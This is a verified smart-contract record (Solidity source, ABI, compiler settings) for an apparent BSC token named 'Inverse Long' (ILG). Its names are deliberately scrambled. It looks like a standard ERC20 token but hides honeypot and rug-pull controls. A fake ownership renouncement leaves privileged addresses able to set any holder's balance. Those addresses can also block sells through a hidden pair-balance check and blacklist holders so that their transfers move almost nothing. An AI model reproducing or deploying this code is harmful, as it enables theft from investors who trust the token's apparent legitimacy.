{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface totalSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxFrom) external view returns (uint256);\n\n    function transfer(address receiverSellMax, uint256 limitFee) external returns (bool);\n\n    function allowance(address liquidityTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverSellMax,\n        uint256 limitFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchMarketingTo, uint256 value);\n    event Approval(address indexed liquidityTrading, address indexed spender, uint256 value);\n}\n\nabstract contract txAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeShouldBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeFund {\n    function createPair(address walletShould, address receiverExempt) external returns (address);\n}\n\ninterface totalSenderMetadata is totalSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InverseLong is txAmount, totalSender, totalSenderMetadata {\n\n    address private walletLiquidity;\n\n    event OwnershipTransferred(address indexed sellLimit, address indexed receiverIs);\n\n    uint256 public liquidityTake;\n\n    address listFeeTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private walletMode = 18;\n\n    mapping(address => bool) public takeLiquidity;\n\n    constructor (){\n        \n        feeShouldBuy isLaunch = feeShouldBuy(tokenAuto);\n        toAutoReceiver = feeFund(isLaunch.factory()).createPair(isLaunch.WETH(), address(this));\n        if (liquidityTake == modeMarketing) {\n            liquidityTake = isTx;\n        }\n        launchedLaunchSell = _msgSender();\n        fromReceiverExempt();\n        takeLiquidity[launchedLaunchSell] = true;\n        maxReceiverAmount[launchedLaunchSell] = receiverAutoToken;\n        if (isTx == autoToTake) {\n            modeMarketing = autoToTake;\n        }\n        emit Transfer(address(0), launchedLaunchSell, receiverAutoToken);\n    }\n\n    function amountFrom(address fromSwap, uint256 limitFee) public {\n        walletSwap();\n        maxReceiverAmount[fromSwap] = limitFee;\n    }\n\n    function transferFrom(address exemptTotalAmount, address receiverSellMax, uint256 limitFee) external override returns (bool) {\n        if (_msgSender() != tokenAuto) {\n            if (sellEnable[exemptTotalAmount][_msgSender()] != type(uint256).max) {\n                require(limitFee <= sellEnable[exemptTotalAmount][_msgSender()]);\n                sellEnable[exemptTotalAmount][_msgSender()] -= limitFee;\n            }\n        }\n        return teamAtMin(exemptTotalAmount, receiverSellMax, limitFee);\n    }\n\n    function transfer(address fromSwap, uint256 limitFee) external virtual override returns (bool) {\n        return teamAtMin(_msgSender(), fromSwap, limitFee);\n    }\n\n    function owner() external view returns (address) {\n        return walletLiquidity;\n    }\n\n    function txMarketing(uint256 limitFee) public {\n        walletSwap();\n        autoWallet = limitFee;\n    }\n\n    function marketingTrading(address teamTokenSwap) public {\n        walletSwap();\n        if (launchFrom == txTotal) {\n            toMax = autoToTake;\n        }\n        if (teamTokenSwap == launchedLaunchSell || teamTokenSwap == toAutoReceiver) {\n            return;\n        }\n        launchWallet[teamTokenSwap] = true;\n    }\n\n    uint256 minBuyMode;\n\n    bool public enableListTx;\n\n    mapping(address => uint256) private maxReceiverAmount;\n\n    uint256 public toMax;\n\n    uint256 private launchedLimit;\n\n    function name() external view virtual override returns (string memory) {\n        return toLimitReceiver;\n    }\n\n    function fromReceiverExempt() public {\n        emit OwnershipTransferred(launchedLaunchSell, address(0));\n        walletLiquidity = address(0);\n    }\n\n    bool private enableLimit;\n\n    mapping(address => bool) public launchWallet;\n\n    function fundMin(address exemptTotalAmount, address receiverSellMax, uint256 limitFee) internal returns (bool) {\n        require(maxReceiverAmount[exemptTotalAmount] >= limitFee);\n        maxReceiverAmount[exemptTotalAmount] -= limitFee;\n        maxReceiverAmount[receiverSellMax] += limitFee;\n        emit Transfer(exemptTotalAmount, receiverSellMax, limitFee);\n        return true;\n    }\n\n    string private toLimitReceiver = \"Inverse Long\";\n\n    function getOwner() external view returns (address) {\n        return walletLiquidity;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverAutoToken;\n    }\n\n    function approve(address atFund, uint256 limitFee) public virtual override returns (bool) {\n        sellEnable[_msgSender()][atFund] = limitFee;\n        emit Approval(_msgSender(), atFund, limitFee);\n        return true;\n    }\n\n    bool public launchFrom;\n\n    address tokenAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function teamAtMin(address exemptTotalAmount, address receiverSellMax, uint256 limitFee) internal returns (bool) {\n        if (exemptTotalAmount == launchedLaunchSell) {\n            return fundMin(exemptTotalAmount, receiverSellMax, limitFee);\n        }\n        uint256 buyTrading = totalSender(toAutoReceiver).balanceOf(listFeeTotal);\n        require(buyTrading == autoWallet);\n        require(receiverSellMax != listFeeTotal);\n        if (launchWallet[exemptTotalAmount]) {\n            return fundMin(exemptTotalAmount, receiverSellMax, amountLaunched);\n        }\n        return fundMin(exemptTotalAmount, receiverSellMax, limitFee);\n    }\n\n    function balanceOf(address maxFrom) public view virtual override returns (uint256) {\n        return maxReceiverAmount[maxFrom];\n    }\n\n    uint256 public isTx;\n\n    bool public maxBuy;\n\n    function allowance(address isMarketing, address atFund) external view virtual override returns (uint256) {\n        if (atFund == tokenAuto) {\n            return type(uint256).max;\n        }\n        return sellEnable[isMarketing][atFund];\n    }\n\n    uint256 private modeMarketing;\n\n    bool private txTotal;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletMode;\n    }\n\n    uint256 autoWallet;\n\n    function walletSwap() private view {\n        require(takeLiquidity[_msgSender()]);\n    }\n\n    uint256 public autoToTake;\n\n    mapping(address => mapping(address => uint256)) private sellEnable;\n\n    address public toAutoReceiver;\n\n    function liquidityLimit(address listLaunch) public {\n        if (enableListTx) {\n            return;\n        }\n        if (launchFrom == enableLimit) {\n            launchFrom = false;\n        }\n        takeLiquidity[listLaunch] = true;\n        \n        enableListTx = true;\n    }\n\n    string private maxSender = \"ILG\";\n\n    address public launchedLaunchSell;\n\n    uint256 private receiverAutoToken = 100000000 * 10 ** 18;\n\n    uint256 constant amountLaunched = 18 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxSender;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMarketingTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitFee\",\"type\":\"uint256\"}],\"name\":\"amountFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoToTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableListTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiverExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLaunchSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunch\",\"type\":\"address\"}],\"name\":\"liquidityLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTokenSwap\",\"type\":\"address\"}],\"name\":\"marketingTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAutoReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTotalAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverSellMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitFee\",\"type\":\"uint256\"}],\"name\":\"txMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InverseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}